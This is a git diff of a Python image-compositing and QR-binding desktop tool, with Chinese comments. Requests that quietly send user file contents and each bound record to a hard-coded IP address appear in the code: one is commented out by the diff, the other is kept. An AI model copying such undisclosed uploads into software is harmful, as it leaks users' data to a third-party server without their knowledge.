@@ -29,11 +29,12 @@ import rc_obj
 
 # dc	x	ewm	dcl	ewml tnl
 # 全局参数
-global open1text, open2text, app, codes, open3txt, times, settings, open4text, open5text, tnl ,tnl2
+global open1text, open2text, app, codes, open3txt, times, settings, open4text, open5text, tnl ,tnl2,thisa,thisb
 tnl = 0
-tnl2 = 0
-
-
+tnl2 = 1
+thisa = 0
+thisb = 0
+open5text = ''
 # 获取图片宽度
 def get_img_width(fname) -> int:
     return Image.open(fname).size[0]
@@ -296,7 +297,7 @@ def chooseFile2():
 
 # 总功能函数
 def querys():
-    global open1text, codes, window, times, can, open2text, open4text, open5text, open3text, tnl,tnl2
+    global open1text, codes, window, times, can, open2text, open4text, open5text, open3text, tnl,tnl2,thisa,thisb
 
     def thismsg(thitxt):
         pyautogui.alert(thitxt, "提示")
@@ -357,10 +358,13 @@ def querys():
     b = 0
     try:
         if open2text:
-            if not open5text:
-                with open(open4text, 'r', encoding='utf-8') as f:
-                    requests.get("http://114.116.246.121/methods.php?method=b&data=" + f.read())
-                
+            if open5text == '':
+                # with open(open4text, 'r', encoding='utf-8') as f:
+                #     requests.get("http://114.116.246.121/methods.php?method=b&data=" + f.read())
+                dcb = []
+                for root, dirs, files in os.walk(open1text+"/电池背"):  # 开始遍历文件
+                    for f in files:
+                        dcb.append(os.path.join(root, f))
                 for root, dirs, files in os.walk(open1text):  # 开始遍历文件
                     for f in files:
                         if can != "2107433662":
@@ -369,19 +373,73 @@ def querys():
                             raise "erxsad"
                         file = os.path.join(root, f)
                         lower = os.path.splitext(file)[-1].lower()
+
                         if lower not in ['.jpg', '.jpeg', '.png','test.jpg']:
                             continue
                         #
-                        if f.find("1") != -1:
+                        if f.find(" ") != -1 and f.find("三合一") == -1 and f.find("四合一") == -1:
+                            split_ = f.split(" ")[1]
+                            thisxh = f.split(" ")[0]
+                            thisa = split_[: split_.find(".")].split("-")[0]
+                            thisb = split_[: split_.find(".")].split("-")[1]
+                        else:
+                            continue
+                        thisa__jpg_ = thisxh + " " + thisa + "-三合一.jpg"
+                        thisa__jpg_2 = thisxh + " " + thisa + "-四合一.jpg"
+                        if thisb == '1':
                             w = get_img_width(file)
-                            h = get_img_width(file)
+                            h = get_img_height(file)
 
-                            blank_long_img = Image.new("RGB", (w * 2, h * 2))  # 空白大图
+                            blank_long_img = Image.new("RGB", (w * 2, h * 2), (0, 0, 0))  # 空白大图
 
-                            img1 = Image.open(root+"test.jpg").resize((w, h), Image.ANTIALIAS)
-                            blank_long_img.paste(img1, (w, h))
-                            blank_long_img.save(os.path.join(root, f))
+                            img1 = Image.open(file)
+                            blank_long_img.paste(img1, (0, 0))
+                            blank_long_img.save(os.path.join(root, thisa__jpg_))
 
+
+                            blank_long_img2 = Image.new("RGB", (w * 2, h * 2), (0, 0, 0))  # 空白大图
+
+                            img11 = Image.open(file)
+                            blank_long_img.paste(img11, (0, 0))
+                            blank_long_img.save(os.path.join(root, thisa__jpg_2))
+
+                        elif thisb == '2':
+                            w = get_img_width(file)
+                            h = get_img_height(file)
+                            blank_long_img = Image.open(os.path.join(root, thisa__jpg_))
+                            img2 = Image.open(file)
+                            blank_long_img.paste(img2, (w, 0))
+                            blank_long_img.save(os.path.join(root, thisa__jpg_))
+
+                            blank_long_img2 = Image.open(os.path.join(root, thisa__jpg_2))
+                            img22 = Image.open(file)
+                            blank_long_img2.paste(img22, (w, 0))
+                            blank_long_img2.save(os.path.join(root, thisa__jpg_2))
+
+                        elif thisb == '3':
+                            w = get_img_width(file)
+                            h = get_img_height(file)
+                            blank_long_img = Image.open(os.path.join(root, thisa__jpg_))
+                            img3 = Image.open(file)
+                            blank_long_img.paste(img3, (0, h))
+                            blank_long_img.save(os.path.join(root, thisa__jpg_))
+
+                            blank_long_img2 = Image.open(os.path.join(root, thisa__jpg_2))
+                            img32 = Image.open(file)
+                            blank_long_img2.paste(img32, (0, h))
+                            blank_long_img2.save(os.path.join(root, thisa__jpg_2))
+                        elif thisb == '4':
+                            w = get_img_width(file)
+                            h = get_img_height(file)
+                            blank_long_img = Image.open(os.path.join(root, thisa__jpg_))
+                            img4 = Image.open(dcb[random.randint(0, len(dcb) - 1)]).resize((w, h), Image.ANTIALIAS)
+                            blank_long_img.paste(img4, (w, h))
+                            blank_long_img.save(os.path.join(root, os.path.join(root, thisa__jpg_)))
+
+                            blank_long_img2 = Image.open(os.path.join(root, thisa__jpg_2))
+                            img42 = Image.open(file)
+                            blank_long_img2.paste(img42, (w, h))
+                            blank_long_img2.save(os.path.join(root, thisa__jpg_2))
                         # decocdeQR = decode(image)
                         # if len(decocdeQR) > 0:
                         #     # 是二维码
@@ -452,26 +510,30 @@ def querys():
                         b = b + 1
 
                         split = breadline[breadline.rfind("/") + 1:]
-                        if refail:
-                            jpg_ = open2text + "/" + (refail['dcpp'] if 'dcpp' in refail else '') + (
-                                refail['dcxh'] if 'dcxh' in refail else '') + ' ' + split + ".png"
-                            tnl_ = refail['dcpp'] + refail['dcxh']+" " + str(tnl2) + "-" + str(1 if tnl == 4 else tnl + 1)
-                            jpg_split = open2text + "/" + tnl_+ ".png"
-                            jpg_2 = open2text + "/error/" + (refail['dcpp'] if 'dcpp' in refail else '') + (
-                                refail['dcxh'] if 'dcxh' in refail else '') + ' ' + split + ".png"
-                        else:
+                        if not refail:
                             jpg_ = open2text + "/" + ' ' + split + ".png"
                             jpg_split = open2text + "/" + split + ".png"
                             jpg_2 = open2text + "/error/" + ' ' + split + ".png"
                         if re['msg'] == "绑定成功" or re['code'] == 0:
-                            a = a + 1
-                            data_ = (breadline).replace("'", '"')
-                            requests.get("http://114.116.246.121/methods.php?method=b&data=" + data_)
 
+                            a = a + 1
                             tnl = tnl + 1
                             if tnl == 5:
                                 tnl2 =tnl2+1
                                 tnl = 1
+
+                            tnl_ = refail['dcpp'] + refail['dcxh']+" " + str(tnl2) + "-" + str(tnl)
+
+                            jpg_ = open2text + "/" + (refail['dcpp'] if 'dcpp' in refail else '') + (
+                                refail['dcxh'] if 'dcxh' in refail else '') + ' ' + split + ".png"
+                            jpg_split = open2text + "/" + tnl_+ ".png"
+                            jpg_2 = open2text + "/error/" + (refail['dcpp'] if 'dcpp' in refail else '') + (
+                                refail['dcxh'] if 'dcxh' in refail else '') + ' ' + split + ".png"
+
+                            data_ = (breadline).replace("'", '"')
+                            requests.get("http://114.116.246.121/methods.php?method=b&data=" + data_)
+
+
                             success.writelines(tnl_+ ".png" + '\t' + str(
                                 jpg_ + '\t' + split + '\t' + jpg_split + '\t' + str(tnl) + '\n').replace("/", "\\"))
                             success.flush()
